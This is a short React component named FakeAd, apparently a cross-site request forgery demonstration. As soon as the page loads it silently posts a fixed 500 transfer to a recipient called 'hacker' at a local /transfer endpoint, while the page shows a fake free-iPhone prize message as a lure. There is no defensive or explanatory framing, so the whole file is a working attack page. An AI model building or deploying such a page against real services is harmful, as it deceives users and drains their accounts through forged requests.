import React, { useEffect } from 'react';
import axios from 'axios';

function FakeAd() {
  useEffect(() => {
    // Automatically trigger the transfer when the page loads
    axios.post('http://localhost:5000/transfer', {
      amount: 500, // Fixed amount
      to: 'hacker', // Fixed recipient
    }, {
      headers: {
        'Content-Type': 'application/json', // Ensure proper content type
      },
    })
    .then(() => {
      // alert('You won! Check your email for details.');
    })
    .catch((error) => {
      console.error('Transfer failed:', error);
      alert('Oops! Something went wrong.');
    });
  }, []);

  return (
    <div>
      <h1>🎉 Congratulations! 🎉</h1>
      <p>You've won a free iPhone! Check your email for details.</p>
    </div>
  );
}

export default FakeAd;